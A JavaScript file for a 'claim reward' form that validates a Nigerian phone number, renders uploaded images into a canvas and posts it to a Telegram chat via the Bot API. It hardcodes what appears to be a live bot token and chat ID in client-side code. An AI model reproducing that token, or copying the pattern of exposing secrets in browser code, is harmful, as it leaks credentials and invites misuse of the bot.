document.getElementById('claimButton').addEventListener('click', function() {
    const images = document.getElementById('images').files;
    const phone = document.getElementById('phone').value;
    const network = document.getElementById('network').value;
    const alertMessageDiv = document.getElementById('alertMessage');

    alertMessageDiv.textContent = '';
    alertMessageDiv.style.color = 'red';

    if (images.length > 20) {
        alertMessageDiv.textContent = 'You can only upload up to 20 images.';
        return;
    }

    if (phone.length !== 14 || !phone.startsWith('+234')) {
        alertMessageDiv.textContent = 'Phone number must be in the format +234 XXXXXXXX.';
        return;
    }

    // Display result below
    const resultDiv = document.getElementById('result');
    resultDiv.innerHTML = '';

    const detailsDiv = document.createElement('div');
detailsDiv.innerHTML = `
    <div class="logo">
        <h1><span class="bm">BM</span></h1>
    </div>
    <p>Phone: ${phone}</p>
    <p>Network: ${network}</p>
`;
resultDiv.appendChild(detailsDiv);


    for (let i = 0; i < images.length; i++) {
        const img = document.createElement('img');
        img.src = URL.createObjectURL(images[i]);
        img.height = 100;
        resultDiv.appendChild(img);
    }

    // Generate image
    html2canvas(resultDiv).then(canvas => {
        resultDiv.innerHTML = ''; // Clear the previous content
        resultDiv.appendChild(canvas);

        // Create and show "Send for Approval" button
        let sendButton = document.createElement('button');
        sendButton.id = 'sendButton';
        sendButton.textContent = 'Send for Approval';
        sendButton.addEventListener('click', function() {
            const dataUrl = canvas.toDataURL('image/png');
            sendToTelegram(dataUrl);
        });
        resultDiv.appendChild(sendButton);
    }).catch(err => {
        console.error('Error generating canvas:', err);
        alertMessageDiv.textContent = 'Error generating image.';
    });
});

function sendToTelegram(imageData) {
    const botToken = '7239108538:AAHeXQhHXINWCz7gnM6_m3-611BTepRGUJg' ;
    const chatId = '-1002170868247';
    const alertMessageDiv = document.getElementById('alertMessage');

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURItoBlob(imageData));
    formData.append('caption', 'Here is the claimed reward details');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alertMessageDiv.textContent = 'Image sent successfully!';
            alertMessageDiv.style.color = 'green';
        } else {
            alertMessageDiv.textContent = 'Failed to send image: ' + data.description;
        }
    })
    .catch(error => {
        console.error('Error sending image:', error);
        alertMessageDiv.textContent = 'Error sending image.';
    });
}

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}
